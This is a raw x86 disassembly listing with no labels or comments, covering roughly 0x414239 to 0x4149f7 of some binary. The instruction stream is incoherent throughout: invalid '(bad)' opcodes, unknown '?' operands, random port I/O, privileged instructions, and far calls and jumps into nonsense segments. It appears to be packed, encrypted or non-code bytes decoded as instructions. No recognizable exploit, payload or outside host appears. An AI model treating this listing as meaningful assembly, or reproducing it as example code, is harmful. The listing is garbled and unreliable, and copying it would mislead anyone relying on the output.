  414239:	cmp    eax,0x8e7e01de
  41423e:	dec    edx
  41423f:	cmp    DWORD PTR cs:[ebp+0x2c],ecx
  414243:	lea    edx,[ebx+0x6]
  414246:	or     al,0xa6
  414248:	pushf  
  414249:	lods   al,BYTE PTR ds:[esi]
  41424a:	mov    cl,0xd8
  41424c:	aaa    
  41424d:	or     DWORD PTR [eax+0x80c9c26],ebp
  414253:	mov    BYTE PTR [ebp-0x6e],dh
  414256:	fwait
  414257:	inc    ebx
  414258:	inc    esi
  414259:	mov    esp,DWORD PTR [ebx-0x35]
  41425c:	pop    esi
  41425d:	sub    BYTE PTR [ebx-0x5cfe927d],ah
  414263:	push   ebp
  414264:	arpl   si,si
  414266:	sti    
  414267:	and    dl,BYTE PTR [ecx]
  414269:	dec    edi
  41426a:	mov    WORD PTR [ecx-0x11],ds
  41426d:	lds    eax,FWORD PTR [edx]
  41426f:	adc    esi,DWORD PTR ds:[ecx+0x38]
  414273:	jl     0x414208
  414275:	pusha  
  414276:	aad    0xb7
  414278:	xor    ah,BYTE PTR [esi+ecx*4]
  41427b:	sbb    ecx,DWORD PTR ds:0x5b83fc39
  414281:	not    DWORD PTR [eax-0x5d979cc9]
  414287:	mov    al,0x9a
  414289:	cdq    
  41428a:	dec    ebp
  41428b:	daa    
  41428c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428d:	addr16 leave 
  41428f:	cs ror edx,1
  414292:	jl     0x4142a3
  414294:	adc    BYTE PTR [eax],ah
  414296:	imul   esi,DWORD PTR [edx-0x6a],0xed865603
  41429d:	sub    dh,cl
  41429f:	mov    ebp,edi
  4142a1:	int3   
  4142a2:	cli    
  4142a3:	xlat   BYTE PTR ds:[ebx]
  4142a4:	pop    ds
  4142a5:	ja     0x414283
  4142a7:	xchg   edi,eax
  4142a8:	pop    ss
  4142a9:	jns    0x4142bc
  4142ab:	inc    eax
  4142ac:	xchg   esp,eax
  4142ad:	pop    edx
  4142ae:	aaa    
  4142af:	cs mov ecx,0xa06c376c
  4142b5:	push   ebx
  4142b6:	xchg   BYTE PTR [edi+0x74a70481],bl
  4142bc:	inc    edi
  4142bd:	push   0x50922699
  4142c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c3:	jae    0x41428e
  4142c5:	and    edx,DWORD PTR [edx+0x65ebfa46]
  4142cb:	out    dx,al
  4142cc:	(bad)  
  4142ce:	inc    DWORD PTR [edx]
  4142d0:	mov    ebp,0x5ce7aa07
  4142d5:	sar    BYTE PTR [esi],1
  4142d7:	sub    eax,0xa7e6f4dc
  4142dc:	(bad)  
  4142dd:	mov    edi,ds
  4142df:	imul   edx,DWORD PTR [bp+0x563f],0xc49ee7e1
  4142e8:	sub    al,0xef
  4142ea:	jmp    0x986:0x68309791
  4142f1:	loop   0x41427b
  4142f3:	push   ebp
  4142f4:	adc    BYTE PTR [eax+0x5f],ah
  4142f7:	xchg   ebx,eax
  4142f8:	repnz xchg ecx,eax
  4142fa:	push   ds
  4142fb:	test   eax,0x7ee07111
  414300:	or     esi,DWORD PTR [ecx-0x2d]
  414303:	jne    0x414327
  414305:	sub    ch,0xf6
  414308:	test   ecx,esp
  41430a:	add    ebx,esi
  41430c:	push   ebp
  41430d:	jmp    0xfc2c:0xe547edd6
  414314:	sub    eax,0xc4ecae1f
  414319:	stos   DWORD PTR es:[edi],eax
  41431a:	aam    0xf9
  41431c:	sbb    BYTE PTR [edi-0x13ad9adb],bh
  414322:	mov    edi,0x4ada2475
  414327:	cmp    ah,BYTE PTR [eax-0x2b]
  41432a:	xor    ecx,edi
  41432c:	push   esi
  41432d:	cmp    al,0xa9
  41432f:	mov    edi,0xb7fe7792
  414334:	int3   
  414335:	retf   
  414336:	push   ss
  414337:	fsubr  st,st(6)
  414339:	stos   DWORD PTR es:[edi],eax
  41433a:	popf   
  41433b:	mov    ah,0xdd
  41433d:	sbb    BYTE PTR [esi+ecx*1],0xd4
  414341:	ret    0x92be
  414344:	nop
  414345:	sub    al,BYTE PTR ds:0x2197323d
  41434b:	leave  
  41434c:	std    
  41434d:	repnz push es
  41434f:	xor    eax,0x41c10b65
  414354:	push   cs
  414355:	es dec esp
  414357:	xor    ch,BYTE PTR [ebp+edx*2-0x2db7bca1]
  41435e:	mov    WORD PTR [edi],ds
  414360:	ins    BYTE PTR es:[edi],dx
  414361:	test   al,0xec
  414363:	dec    edx
  414364:	ja     0x414346
  414366:	mov    ds:0x226c0f7b,eax
  41436b:	stos   BYTE PTR es:[edi],al
  41436c:	stos   BYTE PTR es:[edi],al
  41436d:	ret    0x949c
  414370:	ja     0x4142fc
  414372:	pop    ebx
  414373:	cmp    eax,0x9f2c424d
  414378:	stos   BYTE PTR es:[edi],al
  414379:	jmp    esi
  41437b:	jns    0x4142fe
  41437d:	jb     0x414334
  41437f:	adc    al,0x10
  414381:	lock out dx,al
  414383:	push   esi
  414384:	mov    al,ds:0x8b7c7fe7
  414389:	cmp    eax,0xf58e00b8
  41438e:	imul   esp,edi,0x99679339
  414394:	mov    ecx,fs
  414396:	ins    DWORD PTR es:[edi],dx
  414397:	call   0xd0f:0x4c6a14d9
  41439e:	fs out dx,eax
  4143a0:	call   0x10fc52ac
  4143a5:	pop    edi
  4143a6:	sbb    BYTE PTR ds:0xa4fc1867,dl
  4143ac:	push   0xc9e08948
  4143b1:	in     al,dx
  4143b2:	aas    
  4143b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b4:	daa    
  4143b5:	inc    ebp
  4143b6:	ss out dx,eax
  4143b8:	and    al,0x35
  4143ba:	imul   eax,DWORD PTR [esi+0x74886962],0xffffffc9
  4143c1:	inc    BYTE PTR [ecx-0x604ce5f9]
  4143c7:	sti    
  4143c8:	add    eax,0xf49734e3
  4143cd:	das    
  4143ce:	repz lds ebx,FWORD PTR [ebx+0x3c63b12f]
  4143d5:	jecxz  0x4143f4
  4143d7:	or     ch,BYTE PTR [ebp+0x5bc11c46]
  4143dd:	add    BYTE PTR [edi-0x15],dl
  4143e0:	mov    ebx,0xa5084940
  4143e5:	cmp    edi,DWORD PTR [eax]
  4143e7:	repz sub ecx,eax
  4143ea:	adc    ah,bl
  4143ec:	ret    
  4143ed:	jno    0x4143c3
  4143ef:	outs   dx,DWORD PTR ds:[esi]
  4143f0:	mov    eax,ds:0x7ffa6bc8
  4143f5:	imul   edi,ecx,0xffffff8d
  4143f8:	jb     0x4143df
  4143fa:	sti    
  4143fb:	push   ds
  4143fc:	(bad)  
  4143fd:	int    0x92
  4143ff:	out    0x72,al
  414401:	inc    eax
  414402:	mov    esp,0x3e885fa5
  414407:	iret   
  414408:	not    DWORD PTR [edx-0x44]
  41440b:	js     0x414439
  41440d:	pop    esp
  41440e:	mov    eax,edx
  414410:	stos   BYTE PTR es:[edi],al
  414411:	(bad)  
  414413:	retf   0x280c
  414416:	in     al,0x35
  414418:	sbb    ch,ch
  41441a:	jp     0x41442b
  41441c:	jmp    0x4fb401
  414421:	loopne 0x41440f
  414423:	popf   
  414424:	sti    
  414425:	popa   
  414426:	fsubr  QWORD PTR [ecx]
  414428:	ja     0x414420
  41442a:	js     0x41446a
  41442c:	das    
  41442d:	or     BYTE PTR [ebp+0x7f],dl
  414430:	sbb    BYTE PTR [edx-0xf98fab9],cl
  414436:	mov    dl,0xd0
  414438:	push   edi
  414439:	and    BYTE PTR [edx],dl
  41443b:	clc    
  41443c:	loop   0x41444e
  41443e:	push   esi
  41443f:	mov    eax,0xb1fc5f1f
  414444:	daa    
  414445:	in     eax,0x3d
  414447:	xchg   ebp,eax
  414448:	sar    DWORD PTR [ecx-0x30],cl
  41444b:	cmp    ebx,DWORD PTR [edx+0x24952370]
  414451:	sbb    BYTE PTR [esi+edi*8+0x60],ch
  414455:	call   0x6531f919
  41445a:	ds mov bx,0xc362
  41445f:	mov    DWORD PTR [ebp-0x67],ecx
  414462:	aad    0xb
  414464:	sub    ch,BYTE PTR cs:[ebx+0x7e]
  414468:	js     0x4144a4
  41446a:	in     eax,0xa0
  41446c:	pop    edi
  41446d:	mov    edi,?
  41446f:	repz ret 
  414471:	inc    esi
  414472:	aad    0xd7
  414474:	lods   eax,DWORD PTR ds:[esi]
  414475:	aaa    
  414476:	dec    ebp
  414477:	push   edi
  414478:	push   0xa610bd6f
  41447d:	js     0x41444e
  41447f:	sub    al,0x70
  414481:	sahf   
  414482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414483:	push   es
  414484:	xchg   edx,eax
  414485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414486:	aad    0x6d
  414488:	mov    al,0x8
  41448a:	cdq    
  41448b:	rol    DWORD PTR ds:[ecx-0x7f81521],cl
  414492:	lods   eax,DWORD PTR ds:[esi]
  414493:	inc    ecx
  414494:	scas   eax,DWORD PTR es:[edi]
  414495:	shl    DWORD PTR [edi+ebp*2-0x6be859ae],0x83
  41449d:	add    esi,DWORD PTR [edi+edx*1+0x56]
  4144a1:	test   DWORD PTR [edi],edx
  4144a3:	jo     0x414476
  4144a5:	rol    BYTE PTR [ebx-0x7000522e],cl
  4144ab:	dec    esp
  4144ac:	gs adc al,0x41
  4144af:	pop    ecx
  4144b0:	sub    esp,DWORD PTR [edx-0x1a80ff95]
  4144b6:	xor    al,0x75
  4144b8:	inc    ebp
  4144b9:	ss jg  0x4144bf
  4144bc:	jle    0x414533
  4144be:	lods   eax,DWORD PTR ds:[esi]
  4144bf:	mov    WORD PTR [edi],?
  4144c1:	mov    eax,0x62687139
  4144c6:	jnp    0x414493
  4144c8:	xor    DWORD PTR [eax],esp
  4144ca:	add    bh,bl
  4144cc:	sub    esp,DWORD PTR [ebp-0x3d]
  4144cf:	mov    esp,0xfd10c6a7
  4144d4:	xchg   ebp,eax
  4144d6:	int    0x7f
  4144d8:	iret   
  4144d9:	pop    esi
  4144da:	or     esi,eax
  4144dc:	lods   eax,DWORD PTR ds:[esi]
  4144dd:	cmp    al,0x3
  4144df:	rcl    BYTE PTR [ebx+edx*8],1
  4144e2:	dec    esp
  4144e3:	mov    ecx,0x62257958
  4144e8:	inc    esi
  4144e9:	lea    ecx,[ebx+ebx*8-0x5d]
  4144ed:	mov    al,ds:0x7ae7506d
  4144f2:	add    DWORD PTR [esi+0x30],0x11
  4144f6:	inc    esp
  4144f7:	mov    bh,0xec
  4144f9:	mov    edi,0xc783ba86
  4144fe:	shl    BYTE PTR [eax],0x7a
  414501:	push   0x35
  414503:	(bad)  
  414504:	pop    ss
  414505:	push   0x16
  414507:	add    eax,0x39ec681a
  41450c:	mov    cl,0x4c
  41450e:	or     al,ah
  414510:	mov    al,0xbb
  414512:	and    al,0x71
  414514:	(bad)  
  414515:	xor    BYTE PTR [ebp-0x7e],bl
  414518:	pop    edi
  414519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451a:	hlt    
  41451b:	mov    al,bh
  41451d:	push   ecx
  41451e:	mov    al,0x5b
  414520:	sbb    BYTE PTR [edx+ecx*1],0x15
  414524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414525:	fadd   QWORD PTR [edx+0xa04b5df]
  41452b:	jo     0x4144bc
  41452d:	rcl    DWORD PTR [esi+0x34],0x6d
  414531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414532:	xor    BYTE PTR gs:[edi+0x46fa746],ah
  414539:	popa   
  41453a:	cdq    
  41453b:	mov    ah,BYTE PTR [edx]
  41453d:	imul   esi,DWORD PTR [edx],0xffffff80
  414540:	adc    bh,BYTE PTR [ecx]
  414542:	pop    edi
  414543:	jne    0x41453f
  414545:	or     edi,DWORD PTR [ecx]
  414547:	mov    bh,BYTE PTR [ecx+0x1d5a8a93]
  41454d:	test   eax,0xe1f8c2aa
  414552:	ins    BYTE PTR es:[edi],dx
  414553:	test   edx,ebx
  414555:	push   ss
  414556:	pop    ebx
  414557:	cmp    DWORD PTR [esi+0x52],edi
  41455a:	sub    DWORD PTR [esi+0x7c4b9539],ebp
  414560:	sub    eax,0x1da41a97
  414565:	in     al,dx
  414566:	push   eax
  414567:	pop    edi
  414568:	pop    esp
  414569:	stos   DWORD PTR es:[edi],eax
  41456a:	sbb    al,0xf1
  41456c:	das    
  41456d:	adc    al,0x8d
  41456f:	dec    esi
  414570:	scas   al,BYTE PTR es:[edi]
  414571:	mov    ecx,0x48102523
  414576:	xchg   eax,edx
  414578:	mov    ebx,DWORD PTR [eax+0x71]
  41457b:	pop    ds
  41457c:	add    DWORD PTR [edi],0x1a814fdb
  414582:	xchg   ebp,ecx
  414584:	push   cs
  414585:	imul   BYTE PTR ds:0x575e2232
  41458b:	retf   0x8c8b
  41458e:	inc    eax
  41458f:	setl   BYTE PTR [edx+0x2]
  414593:	loop   0x4145b5
  414595:	and    al,0xa5
  414597:	cmc    
  414598:	in     al,0x6e
  41459a:	cmp    al,0x37
  41459c:	cmc    
  41459d:	cmp    eax,0x7e1d1fa5
  4145a2:	fld    TBYTE PTR [ebx+0x23c9f494]
  4145a8:	repz in eax,dx
  4145aa:	xchg   DWORD PTR [esi+0x54],esi
  4145ad:	and    cl,BYTE PTR [edx]
  4145af:	into   
  4145b0:	out    dx,eax
  4145b1:	bound  esi,QWORD PTR [ecx]
  4145b3:	and    al,0x8e
  4145b5:	and    ecx,esp
  4145b7:	sub    edx,DWORD PTR [ebx-0x5e]
  4145ba:	retf   0x4dc3
  4145bd:	mov    ebx,0xa034b2fb
  4145c2:	and    eax,0xd01a21ac
  4145c7:	in     al,dx
  4145c8:	xchg   ecx,eax
  4145c9:	xor    al,BYTE PTR ss:[ebx-0x52cece87]
  4145d0:	nop
  4145d1:	call   0xb4f5:0x91027aff
  4145d8:	or     al,0x1f
  4145da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145db:	cdq    
  4145dc:	enter  0xc14b,0xe
  4145e0:	scas   eax,DWORD PTR es:[edi]
  4145e1:	loope  0x4145ad
  4145e3:	rcr    dh,0x5d
  4145e6:	xor    eax,0x808b6e56
  4145eb:	adc    dh,BYTE PTR [edx+0xbb39de9]
  4145f1:	pop    esi
  4145f2:	stc    
  4145f3:	outs   dx,BYTE PTR ds:[esi]
  4145f4:	mov    edi,0xdd870867
  4145f9:	fnstsw WORD PTR [eax+0x74]
  4145fc:	jmp    0x4145e6
  4145fe:	or     eax,0x8ca87d67
  414603:	fwait
  414604:	mov    al,0x8b
  414606:	mov    DWORD PTR [esi+edx*2-0x7a],edx
  41460a:	jmp    0xd170:0xedca3825
  414611:	push   es
  414612:	daa    
  414613:	adc    bl,BYTE PTR [ebp-0x232c475b]
  414619:	xor    DWORD PTR [ecx],ecx
  41461b:	mov    esi,0x99ae45ed
  414620:	shl    DWORD PTR [eax],cl
  414622:	mov    ds:0x372ef396,al
  414627:	(bad)  
  414628:	icebp  
  414629:	sbb    DWORD PTR [eax-0x73a7618a],0x5
  414630:	out    0xeb,eax
  414632:	cmp    BYTE PTR [ebp+0x1e],ah
  414635:	add    al,0x8e
  414637:	in     al,0x8f
  414639:	xlat   BYTE PTR ds:[ebx]
  41463a:	mov    WORD PTR [esi],es
  41463c:	sub    DWORD PTR [ebp+0x52],eax
  41463f:	stc    
  414640:	mov    dl,dh
  414642:	jg     0x414639
  414644:	cs in  al,dx
  414646:	jns    0x414635
  414648:	mov    cl,dh
  41464a:	fidivr WORD PTR [eax+0x7a]
  41464d:	into   
  41464e:	pop    ecx
  41464f:	ins    DWORD PTR es:[edi],dx
  414650:	push   ss
  414651:	mov    eax,ds:0x37ab033d
  414656:	xchg   ecx,eax
  414657:	fsub   st,st(0)
  414659:	xor    cl,BYTE PTR [ecx]
  41465b:	inc    edi
  41465c:	dec    esp
  41465d:	lods   eax,DWORD PTR ds:[esi]
  41465e:	call   0xfee7:0xdb636142
  414665:	adc    BYTE PTR [eax+0x2bb29402],0x61
  41466c:	inc    esp
  41466d:	xchg   DWORD PTR [ebx],esi
  41466f:	mov    esi,0x65f84c50
  414674:	push   ecx
  414675:	push   ebp
  414676:	imul   esi,DWORD PTR [ebx+0x51],0x65b5a880
  41467d:	mov    cl,0x7f
  41467f:	xchg   ecx,eax
  414680:	jo     0x414606
  414682:	pop    edi
  414683:	sub    esi,eax
  414685:	lods   al,BYTE PTR ds:[esi]
  414686:	jp     0x4146ac
  414688:	push   edi
  414689:	jo     0x414636
  41468b:	call   0x8cb5d845
  414690:	mov    esp,esp
  414692:	fwait
  414693:	mov    bl,0xf0
  414695:	adc    BYTE PTR [edi+ecx*8],dl
  414698:	imul   edx,DWORD PTR [ebp+0x3c0120b2],0xffffffdf
  41469f:	mov    DWORD PTR [esi-0xf],esp
  4146a2:	jo     0x41468e
  4146a4:	pop    esp
  4146a5:	xor    bh,dh
  4146a7:	jns    0x4146b7
  4146a9:	push   esi
  4146aa:	lock int 0x89
  4146ad:	cld    
  4146ae:	jno    0x4146ef
  4146b0:	cs cmp eax,0xf90ee74
  4146b6:	(bad)
  4146ba:	push   es
  4146bb:	stos   BYTE PTR es:[edi],al
  4146bc:	or     eax,0xf3857793
  4146c1:	dec    eax
  4146c2:	push   ebx
  4146c3:	fmulp  st(0),st
  4146c5:	push   0xffffff8d
  4146c7:	daa    
  4146c8:	pop    ebp
  4146c9:	mov    ecx,0xf80a3004
  4146ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146cf:	mov    dh,0x12
  4146d1:	(bad)  
  4146d3:	xlat   BYTE PTR ds:[ebx]
  4146d4:	sbb    BYTE PTR [eax+esi*4+0x29a320b9],dl
  4146db:	cmp    eax,0xa58e70e5
  4146e0:	in     al,0xea
  4146e2:	fisub  WORD PTR [ebp+ecx*2-0x552a9c]
  4146e9:	fsubr  st(5),st
  4146eb:	inc    eax
  4146ec:	mov    DWORD PTR [esi+edx*8+0x3e],esp
  4146f0:	fwait
  4146f1:	sti    
  4146f2:	inc    ebx
  4146f3:	(bad)  
  4146f4:	fdiv   DWORD PTR [edi-0x3c5ead3]
  4146fa:	ret    
  4146fb:	nop
  4146fc:	sbb    al,0xdf
  4146fe:	fdiv   QWORD PTR [eax-0x4d1a9c8d]
  414704:	xor    edx,DWORD PTR [ebp-0x8]
  414707:	inc    eax
  414708:	ror    ecx,cl
  41470a:	in     al,0xe4
  41470c:	out    dx,eax
  41470d:	push   edi
  41470e:	adc    edi,DWORD PTR [edx-0x62]
  414711:	out    0xa9,eax
  414713:	xor    DWORD PTR [edx],edx
  414715:	jg     0x414732
  414717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414718:	gs jl  0x41472e
  41471b:	inc    ebx
  41471c:	enter  0x9cc4,0x63
  414720:	imul   edi,edi,0xb761e51b
  414726:	shr    BYTE PTR [esi],cl
  414728:	shl    BYTE PTR ds:0x51bf633c,0x2e
  41472f:	jns    0x414761
  414731:	mov    ebp,0x4275ac12
  414736:	stc    
  414737:	xor    BYTE PTR [esi+0x417ffdd9],bh
  41473d:	stc    
  41473e:	xor    BYTE PTR [edx+0x2d],al
  414741:	push   es
  414742:	pop    ebp
  414743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414744:	push   es
  414745:	jp     0x41471f
  414747:	pop    ecx
  414748:	mov    es,WORD PTR [edi]
  41474a:	mov    ds:0xdd9f42,eax
  41474f:	ret    0xbda1
  414752:	dec    esi
  414753:	add    ebp,DWORD PTR [edx+0x5e]
  414756:	pop    es
  414757:	inc    esp
  414758:	out    dx,al
  414759:	out    dx,al
  41475a:	dec    ebp
  41475b:	ror    BYTE PTR [eax+0x69],1
  41475e:	and    DWORD PTR [edi+0x5a],eax
  414761:	das    
  414762:	and    BYTE PTR [ebx+0x41],0x4c
  414766:	pop    ss
  414767:	mov    eax,ds:0x7fb4025f
  41476c:	ins    DWORD PTR es:[edi],dx
  41476d:	hlt    
  41476e:	sbb    ebp,DWORD PTR [ebx+0x2e]
  414771:	test   al,0x57
  414773:	pop    edi
  414774:	adc    DWORD PTR [edx],ecx
  414776:	in     al,dx
  414777:	inc    eax
  414778:	jno    0x4147da
  41477a:	js     0x4147a5
  41477c:	scas   eax,DWORD PTR es:[edi]
  41477d:	push   0xffffffee
  41477f:	(bad)  
  414780:	sub    BYTE PTR [edi+0x6aa62072],bl
  414786:	(bad)  
  414787:	call   FWORD PTR [esi-0x7b]
  41478a:	jecxz  0x41475e
  41478c:	push   ecx
  41478d:	icebp  
  41478e:	jb     0x414783
  414790:	dec    eax
  414791:	in     al,0x16
  414793:	scas   al,BYTE PTR es:[edi]
  414794:	das    
  414795:	mov    dl,0xd0
  414797:	pop    edi
  414798:	mov    al,ds:0xdb82cdee
  41479d:	or     bh,dl
  41479f:	mov    esi,0x56330cda
  4147a4:	aad    0xfa
  4147a6:	sub    DWORD PTR [ebx+0x79085777],0xffffff82
  4147ad:	iret   
  4147ae:	into   
  4147af:	outs   dx,BYTE PTR ds:[esi]
  4147b0:	sbb    al,0x7a
  4147b2:	(bad)
  4147b6:	sbb    BYTE PTR [edx+0x3ab96590],bh
  4147bc:	(bad)  
  4147bd:	cwde   
  4147be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147bf:	sub    DWORD PTR [eax],ebp
  4147c1:	fwait
  4147c2:	mov    esp,ss
  4147c4:	ja     0x414816
  4147c6:	inc    ebx
  4147c7:	in     eax,0x65
  4147c9:	push   ss
  4147ca:	leave  
  4147cb:	sub    BYTE PTR [eax],ch
  4147cd:	int3   
  4147ce:	lock push ecx
  4147d0:	hlt    
  4147d1:	bound  edi,QWORD PTR [edx]
  4147d3:	or     ebx,DWORD PTR [ecx-0x5c]
  4147d6:	adc    al,BYTE PTR [ecx+0x56]
  4147d9:	mov    ss,WORD PTR [edx]
  4147db:	fisttp WORD PTR [eax+0x2d]
  4147de:	js     0x414845
  4147e0:	ret    
  4147e1:	jmp    0x3f3ab6ca
  4147e6:	and    ch,BYTE PTR [eax]
  4147e8:	retf   0x6865
  4147eb:	cld    
  4147ec:	pusha  
  4147ed:	aad    0x9b
  4147ef:	scas   eax,DWORD PTR es:[edi]
  4147f0:	cs lock xchg edx,eax
  4147f3:	pop    ebx
  4147f4:	jge    0x4147bd
  4147f6:	xchg   edi,eax
  4147f7:	sub    ch,al
  4147f9:	add    bh,BYTE PTR [edi-0x2e0d37a5]
  4147ff:	and    al,0x17
  414801:	mov    ah,0xd2
  414803:	adc    al,0x9a
  414805:	or     ecx,DWORD PTR [edi-0x590cc901]
  41480b:	jnp    0x414861
  41480d:	in     eax,dx
  41480e:	sub    al,0x50
  414810:	aad    0x9
  414812:	push   esi
  414813:	nop
  414814:	mov    eax,ds:0x91547292
  414819:	jns    0x41484f
  41481b:	scas   al,BYTE PTR es:[edi]
  41481c:	adc    eax,0x84dfaf50
  414821:	fisub  WORD PTR [ecx-0x6b10f638]
  414827:	loope  0x4147cd
  414829:	stos   BYTE PTR es:[edi],al
  41482a:	pop    ebx
  41482b:	ret    0xb7ef
  41482e:	ins    DWORD PTR es:[edi],dx
  41482f:	adc    DWORD PTR ss:[edi],eax
  414832:	pop    cx
  414834:	ins    DWORD PTR es:[edi],dx
  414835:	ds add al,0x79
  414838:	or     DWORD PTR [eax],edx
  41483a:	loopne 0x414843
  41483c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41483d:	jge    0x4148a6
  41483f:	imul   ebp,DWORD PTR [eax+0x72a046ec],0x17ea65c
  414849:	test   dh,dl
  41484b:	(bad)  
  41484c:	(bad)  [ebx-0x68]
  41484f:	sub    bl,0x3e
  414852:	adc    bl,0xf4
  414855:	out    dx,eax
  414856:	jne    0x4148af
  414858:	and    al,0x8
  41485b:	adc    al,0x5
  41485d:	call   0xd761b0d
  414862:	dec    edx
  414863:	in     eax,dx
  414864:	out    dx,al
  414865:	aaa    
  414866:	test   DWORD PTR [ecx],ebx
  414868:	fldenv [ecx]
  41486a:	jmp    0xd722ec15
  41486f:	lock mov esp,0x6bc425a7
  414875:	jne    0x414894
  414877:	jge    0x41483c
  414879:	mov    DWORD PTR [edx+0x44],esp
  41487c:	mov    al,ds:0x22aeb2f9
  414881:	popf   
  414882:	add    eax,0xc7406bea
  414887:	mov    eax,ds:0x96ec660e
  41488c:	imul   ecx,ebx,0xa3ae3d76
  414892:	test   eax,0x6c7441e6
  414897:	pushf  
  414898:	lea    edx,[ecx-0x74d5f093]
  41489e:	ds push eax
  4148a0:	mov    dh,0x9b
  4148a2:	inc    edi
  4148a3:	or     bh,BYTE PTR [ebx+0x45]
  4148a6:	scas   eax,DWORD PTR es:[edi]
  4148a7:	xchg   ecx,eax
  4148a8:	lock loopne 0x41492a
  4148ab:	pop    eax
  4148ac:	push   0x2e
  4148ae:	mov    WORD PTR [ecx-0x78],?
  4148b1:	inc    edx
  4148b2:	dec    ebp
  4148b3:	xchg   esi,eax
  4148b4:	push   edi
  4148b5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4148b7:	mov    dh,0xd6
  4148b9:	xchg   BYTE PTR [ebx+0x47134807],bh
  4148bf:	and    esp,DWORD PTR [edx]
  4148c1:	or     al,0x27
  4148c3:	adc    al,0x22
  4148c5:	adc    al,0x90
  4148c7:	jge    0x41489a
  4148c9:	push   ds
  4148ca:	pop    ds
  4148cb:	cmp    DWORD PTR [esi+eiz*8+0x5b],ecx
  4148cf:	xchg   esp,eax
  4148d0:	dec    esp
  4148d1:	sbb    eax,0xbb2f9141
  4148d6:	push   esp
  4148d7:	pop    esi
  4148d8:	(bad)  
  4148d9:	mov    bl,0x84
  4148db:	pop    ecx
  4148dc:	add    cl,bh
  4148de:	jno    0x4148af
  4148e0:	xchg   esi,eax
  4148e1:	mov    esp,DWORD PTR [edi]
  4148e3:	dec    edi
  4148e4:	and    eax,0xd44a4163
  4148e9:	xchg   DWORD PTR [ebp+0x710482ec],edi
  4148ef:	pushf  
  4148f0:	pop    ebx
  4148f1:	pop    ecx
  4148f2:	call   0xa4b2:0x5c912ce4
  4148f9:	inc    ebp
  4148fa:	jno    0x414925
  4148fc:	ret    
  4148fd:	in     eax,0x1c
  4148ff:	sahf   
  414900:	and    BYTE PTR [esi+0x71ea5706],0xc
  414907:	mov    dh,0x81
  414909:	sub    BYTE PTR [esi-0x25],al
  41490c:	add    al,0xc2
  41490e:	jno    0x4148bf
  414910:	lods   eax,DWORD PTR ds:[esi]
  414911:	mov    esp,0x1ec6d9ab
  414916:	xchg   ecx,eax
  414917:	sbb    al,0x75
  414919:	xor    DWORD PTR [edi],esi
  41491b:	dec    eax
  41491c:	jnp    0x41496a
  41491e:	out    0xc0,al
  414920:	sub    eax,DWORD PTR [esi+0x58]
  414923:	xor    BYTE PTR [edx+eax*4-0x3e],al
  414927:	push   edx
  414928:	cwde   
  414929:	nop
  41492a:	adc    ah,al
  41492c:	xor    al,0xf8
  41492e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41492f:	nop
  414930:	adc    al,dl
  414932:	inc    esp
  414933:	out    0x23,al
  414935:	push   es
  414936:	loop   0x4148ef
  414938:	mov    edx,0x950ad20c
  41493d:	or     ebx,DWORD PTR [esi]
  41493f:	mov    ebp,0x4de18e12
  414944:	lds    ecx,FWORD PTR ds:0x2b1e0067
  41494a:	cmp    al,0xec
  41494c:	push   0x6546a40d
  414951:	push   ebp
  414952:	mov    esi,0x9f84dd4d
  414957:	out    0x5,al
  414959:	or     BYTE PTR [esi],0x4d
  41495c:	adc    BYTE PTR [ebx+0x20d4843b],0xa8
  414963:	jmp    DWORD PTR [eax-0x2c9c1f83]
  414969:	xor    al,0x67
  41496b:	ins    DWORD PTR es:[edi],dx
  41496c:	out    dx,al
  41496d:	gs pop edx
  41496f:	or     DWORD PTR [esi],ebx
  414971:	fiadd  DWORD PTR [esi+0x200907ad]
  414977:	addr16 je 0x41498a
  41497a:	xor    eax,0xb9ad0058
  41497f:	leave  
  414980:	ret    0x93bc
  414983:	dec    esi
  414984:	imul   eax,DWORD PTR [ebx+0x4da258b8],0x64fc9bff
  41498e:	pop    ds
  41498f:	cdq    
  414990:	add    eax,0xed4eda89
  414995:	clc    
  414996:	add    ebx,DWORD PTR [edi-0x19]
  414999:	fidivr WORD PTR [ecx+0x101b54ab]
  41499f:	push   0xc92696f8
  4149a4:	xchg   esp,eax
  4149a5:	mov    ds:0x99824e40,eax
  4149aa:	data16 stc 
  4149ac:	shr    BYTE PTR [eax-0x479ca004],0xd2
  4149b3:	test   ecx,edx
  4149b5:	mov    al,0x87
  4149b7:	inc    edi
  4149b8:	loop   0x4149f9
  4149ba:	adc    ebp,DWORD PTR [edi+0x5f]
  4149bd:	outs   dx,DWORD PTR ds:[esi]
  4149be:	adc    dh,BYTE PTR [ecx]
  4149c0:	int3   
  4149c1:	ins    BYTE PTR es:[edi],dx
  4149c2:	lods   al,BYTE PTR ds:[esi]
  4149c3:	imul   ebp,DWORD PTR [esi],0xffffffb1
  4149c6:	lahf   
  4149c7:	shl    BYTE PTR [edx+0x1d90f4f6],0x91
  4149ce:	push   es
  4149cf:	cld    
  4149d0:	ss call 0xf55a:0xa00b7549
  4149d8:	cmp    al,0xc3
  4149da:	cmp    ebp,ebp
  4149dc:	xlat   BYTE PTR ds:[ebx]
  4149dd:	in     al,0x15
  4149df:	cmc    
  4149e0:	(bad)  
  4149e1:	aas    
  4149e2:	int3   
  4149e3:	dec    eax
  4149e4:	sbb    dh,BYTE PTR [ecx+0x3ad65aec]
  4149ea:	cmc    
  4149eb:	cmc    
  4149ec:	leave  
  4149ed:	ror    BYTE PTR [ebp+0x62],cl
  4149f0:	xlat   BYTE PTR ds:[ebx]
  4149f2:	popa   
  4149f3:	mov    ebp,DWORD PTR [ecx+0x44]
  4149f6:	xchg   esi,eax
  4149f7:	dec    esi
